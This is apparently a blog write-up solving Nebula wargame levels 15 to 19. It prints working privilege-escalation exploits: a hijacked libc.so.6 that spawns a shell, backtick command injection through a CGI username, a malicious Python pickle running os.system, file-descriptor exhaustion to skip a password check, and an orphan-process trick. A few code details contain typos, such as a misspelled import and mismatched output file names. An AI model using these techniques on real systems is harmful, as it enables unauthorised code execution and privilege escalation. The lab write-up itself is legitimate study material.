<p>The large group of <code class="highlighter-rouge">open</code> and <code class="highlighter-rouge">stat64</code> seems to be attempting to open a “libc.so.6” file; however, it cannot find any. Reading the description, it seems we need to create our own “libc.so.6” and place it in one of the directories. This way, we can control the function, and execute arbitary code. A possilbe libc function to replace is <code class="highlighter-rouge">__libc_start_main</code>, which is guarenteed to exist in all executables. This is confirmed by <code class="highlighter-rouge">objdump -r /home/flag15/flag15</code>. Thus, I created the file “/var/tmp/flag15/tmp.c” with the following content:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">__libc_start_main</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="p">(</span><span class="kt">int</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="o">*</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="o">*</span><span class="p">),</span> <span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="o">*</span> <span class="n">ubp_av</span><span class="p">,</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">init</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">),</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">fini</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">),</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">rtld_fini</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span><span class="p">),</span> <span class="kt">void</span> <span class="p">(</span><span class="o">*</span> <span class="n">stack_end</span><span class="p">)){</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>However, when we compile it using the standard command <code class="highlighter-rouge">gcc -fPIC -shared -o libc.so.6 tmp.c</code>, we get the error “/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.0 not defined in file libc.so.6 with link time reference”. The main problem appears to be lack of definition for <code class="highlighter-rouge">__cxa_finalize</code> , which is fixed by adding the following code to “/tmp”:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="n">__cxa_finalize</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span> <span class="n">d</span><span class="p">){</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Recompiling and excecuting, we obtain another relocation error, but for <code class="highlighter-rouge">system</code> this time. This is because <code class="highlighter-rouge">system</code> is a libc function, which is currently dynamically linked in. To statically link in the system, we modify the compiler command to <code class="highlighter-rouge">gcc -fPIC -shared -static-libgcc -Wl,-Bstatic -o libc.so.6 tmp.c</code>. <code class="highlighter-rouge">-Wl</code> specifies arguments for the linker.</p>

<table>
  <tbody>
    <tr>
      <td>This time, the error “Inconsistency detected by ld.so: dl-lookup.c: 169: check_match: Assertion ‘version-&gt;filename == ((void *)0)</td>
      <td> </td>
      <td>! _dl_name_match_p (version-&gt;filename, map)’ failed!” comes up. This is due to the lack of version specification of our library. To fix this, I created another file named “version”, and added it to the linker arguments, so the compile command becomes <code class="highlighter-rouge">gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic -o libc.so.6 tmp.c</code>. The file contains “GLIBC_2.0{};”. For more about version, check out <a href="http://sourceware.org/binutils/docs-2.18/ld/VERSION.html#VERSION">here</a>.</td>
    </tr>
  </tbody>
</table>

<p>Now, compiling and executing the executable spawns a shell. Its priveledges are checked by <code class="highlighter-rouge">whoami</code>. After realising the user is indeed “flag15”, we can execute <code class="highlighter-rouge">getflag</code> successfully.</p>

<p>Don’t forget to clean up by <code class="highlighter-rouge">rm /var/tmp/flag15/*</code> to revert the machine to the previous state.</p>

<h2 id="level16">Level16</h2>

<p>This is a rather simple level. Looking at the source code it can be easily spotted that there is an exploit in the line <code class="highlighter-rouge">egrep "^$username" /home/flag16/userdb.txt 2&gt;&amp;1</code>, as we basically have control over <code class="highlighter-rouge">$username</code>. <code class="highlighter-rouge">$username</code> is first preprocessed by converting all characters to uppercase and stripping all characters after a 0. However, both are only minor conviniences. I planned to set <code class="highlighter-rouge">$username</code> to a custom bash file that executes <code class="highlighter-rouge">getflag</code> and stores the output in a file. I was able to utilise the bash wildcard, the astrick, to specify the pathing, as long as the name of the bash file is correct. At the end, I ended up with the following code, stored in a file named “AAA” in the “/tmp” directory:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>getflag <span class="o">&gt;</span> /tmp/output
</code></pre></div></div>

<p><code class="highlighter-rouge">chmod</code> the script to allow execution. With that file, I was able to call the perl script with the username “`/*/AAA`”. As you can see, there are no spaces or lower case letters in the string, thus it will not be transformed. The backticks are required to allow execution of the inline bash before <code class="highlighter-rouge">egrep</code>. The string is converted to hexadecimal for URL purposes, resulting in “%60%2F%2A%2FAAA%60”. The perl script is executed by <code class="highlighter-rouge">wget -O - "http://127.0.0.1:1616/index.cgi?username=%60%2F%2A%2FAAA%60"</code>. After this, inspect the file “/tmp/output”, which should have the string “You have successfully executed getflag on a target account”, indicating success.</p>

<h2 id="level17">Level17</h2>

<p>This level requires abusing security risks within python’s <code class="highlighter-rouge">pickle</code> module. On python’s official documentation <a href="https://docs.python.org/3/library/pickle.html">for <code class="highlighter-rouge">pickle</code></a>, it is well documented it can run arbitary code. As the vulnerable python file is ran under the “flag17” account, we use it to achieve our desired effect. Further investigation online reveals that the <code class="highlighter-rouge">__reduce__</code> method of the pickled class is ran when loading the pickled data. Therefore, the goal is to dump a pickled object with a custom <code class="highlighter-rouge">__reduce__</code> method and send it to the desired port.</p>

<p>The code we want to run is <code class="highlighter-rouge">getflag</code>. As stdout is not displayed, we need to pipe it into a file. I selected a random file in “/tmp”. The full python code is as follows:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">picke</span>

<span class="n">skt</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
<span class="n">skt</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">'0.0.0.0'</span><span class="p">,</span> <span class="mi">10007</span><span class="p">))</span>

<span class="k">class</span> <span class="nc">p</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">return</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="s">'getflag &gt; /tmp/res.txt'</span><span class="p">,))</span>

<span class="n">skt</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">p</span><span class="p">()))</span>
</code></pre></div></div>

<p>Run the above code using <code class="highlighter-rouge">python2</code>, and check the contents of the file “/tmp/t.txt”. It should contain the desired output, indicating this level is solved.</p>

<h2 id="level18">Level18</h2>

<p>This is what I believe to be the hardest level so far. Looking at the source code, we can notice it is coded quite defensively. All but one string comparisons are length guarded, and the remaining one cannot be abused.</p>

<p>One potential exploit is the format string exploit in <code class="highlighter-rouge">notsupported</code>, where the string <code class="highlighter-rouge">what</code> is printed directly in line 48. Checking the protections on the executable, it appears <code class="highlighter-rouge">FORTIFY_SOURCE</code> has been enabled. This prevents directly overwriting the <code class="highlighter-rouge">globals.loggedin</code> variable. During my research, I did discover an interesting paper on <a href="http://phrack.org/issues/67/9.html">bypassing such protection</a>. However, it was too complicated so I went digging for an easier attack.</p>

<p>A more careful read of the code reveals the program successfully logs in even when the “PWFILE” cannot be read. This reminded me of <a href="https://en.wikipedia.org/wiki/Resource_exhaustion_attack">resource exhaustion attacks</a>, where the software will no longer open more files when the total number of file descriptors allocated to the program has been exhausted. This can be done on a system level (exhausting all files that can be opened by the operating system) or a process level (exhausting all files that can be opened by the process). I feel like the former method is too barbaric, thus I decided to use the latter. The latter limit can be checked with <code class="highlighter-rouge">ulimit -n</code>, which reveals the maximum number of file descriptors allowed is 1024. Subtracting the 3 default ones (stdin, stdout, stderr), we needed to open 1021 files.</p>

<p>When actually running the program, one may notice no output is produced as everything is written to a log file. This can be circumvented by setting the log file to “/dev/tty”, which is the terminal. This way, a more clear output can be obtained.</p>

<p>Looking at the decompiled source code, one may see that that the <code class="highlighter-rouge">globals.debugfile</code> is never closed when it is replaced by another one. This provides the foundation for the exploit. A python program was used to generate a file looking like the following, with “-d /dev/tty” repeated 1021 times:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/home/flag18/flag18 <span class="nt">-d</span> /dev/tty <span class="nt">-d</span> /dev/tty ... <span class="nt">-d</span> /dev/tty
</code></pre></div></div>

<p>Running the this bash script, we can then use “login pw” to login and “shell” to obtain our shell. Fortunately, the first stage passes, we can login. However, when starting the shell process, the error “/home/flag18/flag18: error while loading shared libraries: libncurses.so.5: cannot open shared object file: Error 24” is obtained. This indicates we need to release a file descriptor. The easiest way is to use “closelog” to close the logger after loggin in.</p>

<p>However, this reveals a new problem: “/home/flag18/flag18: -d: invalid option”. This is caused by the same arguments of /home/flag18/flag18 being passed to /bin/bash. To prevent this, we can add a “–rcfile” option as one of the long options. The new script thus becomes:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/home/flag18/flag18 <span class="nt">--rcfile</span> /tmp/t <span class="nt">-d</span> /dev/tty <span class="nt">-d</span> /dev/tty ... <span class="nt">-d</span> /dev/tty
</code></pre></div></div>

<p>Running the commands described previously now works flawlessly. A bash shell has been opened and typing getflag reveals we have successfully completed this level.</p>

<h2 id="level19">Level19</h2>

<p>The source code for this program is relatively simple. The program checks the id of the parent process, and if it is root, then we obtain a privileged shell. This immediately reminded me <a href="https://en.wikipedia.org/wiki/Orphan_process">orphaned child process</a>, which are created when the parent process dies before the child. In this case, the child is automatically attached to the “init” process, which is root. This sets up the basic premise of the attack. A PoC can be created by the following C code.</p>

<pre><code class="language-C">#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;

int main(){
    if (fork() == 0){
        sleep(1);
        execl("/home/flag19/flag19", "/bin/sh", "-c", "getflag&gt;/tmp/o", NULL);
    }else{
        return 0;
    }
}
</code></pre>

<p>After compiling and running the code, the output can be checked at “tmp/o”. Unsuprisingly, it contains the message “You have successfully executed getflag on a target account”.</p>


  </section>
</article>

<section class="read-more">
   
   
   <div class="read-more-item">
       <span class="read-more-item-dim">Recent posts</span>
       <h2 class="post-list__post-title post-title"><a href="/2019/08/tle/" title="link to TLE and memset in competitive programming">TLE and memset in competitive programming</a></h2>
       <p class="excerpt">An interesting phenomenon observed for the time required for memset in competitive programming.</p>
       <div class="post-list__meta"><time datetime="2019-08-20 23:50:12 +1000" class="post-list__meta--date date">2019-08-20</time> &#8226; <span class="post-list__meta--tags tags">competitive programming, discussion, optimisation</span>
       </br></br>
        <a class="btn-border-small" href=/2019/08/tle/>Continue...</a></div>
   </div>
   
   
   
   
   <div class="read-more-item">
       <span class="read-more-item-dim">Earlier posts</span>
       <h2 class="post-list__post-title post-title"><a href="/2019/04/nebula/" title="link to Exploit Education - Nebula: Write-up (Part 1)">Exploit Education - Nebula: Write-up (Part 1)</a></h2>
       <p class="excerpt">Write-ups for all the nebula challenges included in the VM created by exploit education. Nebula covers a variety of simple and intermediate challenges that cover Linux privilege escalation, common scripting language issues, and file system race co...</p>
       <div class="post-list__meta"><time datetime="2019-04-07 22:40:32 +1000" class="post-list__meta--date date">2019-04-07</time> &#8226; <span class="post-list__meta--tags tags">exploit education, solution, nebula</span>
       </br></br>
        <a class="btn-border-small" href=/2019/04/nebula/>Continue...</a></div>
   </div>
   
</section>

<section class="post-comments">
  
    <div id="disqus_thread"></div>
    <script>
    
    var disqus_config = function () {
        this.page.url = "zijunh.github.io/2019/06/nebulla-part-2/";
        this.page.identifier = "/2019/06/nebulla-part-2/";
    };

    var disqus_shortname = 'zijunh';
    
    (function() { // DON'T EDIT BELOW THIS LINE
        var d = document, s = d.createElement('script');
        s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
        })();
    </script>
    <noscript>To view<a href="http://disqus.com/?ref_noscript"> Disqus </a>Comments, please enable JavaScript</noscript>
    
  
  
  
  
</section>


            <section class="footer">
    <footer>
    	<span class="footer__copyright">Created under <a href="http://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></span>
        <span class="footer__copyright">Generated by <a href="https://jekyllrb.com">Jekyll</a> at 2020-02-13. Many thanks to <a href="https://pages.github.com/">Github</a> for the hosting service</span>
        <span class="footer__copyright">Created by <a href="https://github.com/ZijunH/">@ZijunH</a> using the <a href="https://github.com/onevcat/vno-jekyll">Vno - Jekyll</a> theme by @onevcat. Source code found on <a href="https://github.com/ZijunH/zijunh.github.io">github</a> - &copy; 2020</span>
    </footer>
</section>

        </div>
    </div>
    
    <script type="text/javascript" src="//code.jquery.com/jquery-1.11.3.min.js"></script>

<script type="text/javascript" src="/js/main.js"></script>


<script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
    ga('create', 'UA-132056744-1', 'auto');
    ga('send', 'pageview');
</script>


    
  </body>

</html>
